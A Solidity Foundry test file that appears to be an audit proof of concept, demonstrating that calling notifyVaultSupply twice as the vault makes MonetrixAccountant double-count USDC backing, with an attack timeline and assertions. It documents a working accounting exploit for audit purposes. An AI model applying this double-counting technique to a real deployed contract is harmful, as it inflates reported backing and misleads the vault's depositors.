// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";

// ATTACK TIMELINE:
// 1. [Setup] SimulatorBase deploys contracts. We deposit USDC to give vault a balance.
// 2. [T=0] User deposits 1,000,000 USDC into the vault.
// 3. [T=1] Record totalBackingSigned() before adding duplicate entries.
// 4. [T=2] Prank vault and call notifyVaultSupply(0, 0) to add first USDC entry.
// 5. [T=3] Record totalBackingSigned() after first entry.
// 6. [T=4] Prank vault and call notifyVaultSupply(0, 0) to add second USDC entry.
// 7. [T=5] Record totalBackingSigned() after second entry.
// 8. [Assert] The increase from T=3 to T=5 equals the vault's USDC balance, proving double counting.

contract AuditAgentPoC is SimulatorBase {
    function setUp() public {
        super.setUp();
    }

    function test_exploit() public {
        address user = address(0x1234);
        uint256 depositAmount = 1_000_000_000_000; // 1M USDC (6 decimals)

        // Step 1: Deposit USDC to give the vault a balance on HyperCore
        _deposit(user, depositAmount);

        // Step 2: Record initial backing
        int256 backingBefore = accountant.totalBackingSigned();
        console.log("Step 2: backingBefore =", uint256(backingBefore));

        // Step 3: Add first USDC entry to vaultSupplied
        vm.prank(address(vault));
        accountant.notifyVaultSupply(0, 0); // 0 is USDC_TOKEN_INDEX

        int256 backingAfterFirst = accountant.totalBackingSigned();
        console.log("Step 3: backingAfterFirst =", uint256(backingAfterFirst));

        // Step 4: Add second USDC entry to vaultSupplied (duplicate)
        vm.prank(address(vault));
        accountant.notifyVaultSupply(0, 0);

        int256 backingAfterSecond = accountant.totalBackingSigned();
        console.log("Step 4: backingAfterSecond =", uint256(backingAfterSecond));

        // Step 5: Assert double counting
        int256 firstIncrease = backingAfterFirst - backingBefore;
        int256 secondIncrease = backingAfterSecond - backingAfterFirst;

        console.log("First increase =", uint256(firstIncrease));
        console.log("Second increase =", uint256(secondIncrease));

        // The second addition should have increased backing by the same amount as the first
        // This proves the USDC balance is being counted twice
        assertGt(firstIncrease, 0, "First entry should increase backing");
        assertEq(secondIncrease, firstIncrease, "Second duplicate entry incorrectly increases backing by the same amount, proving double-counting");

        // Additional check: total backing is now inflated
        assertGt(backingAfterSecond, backingAfterFirst, "Total backing is inflated by duplicate entry");
    }
}
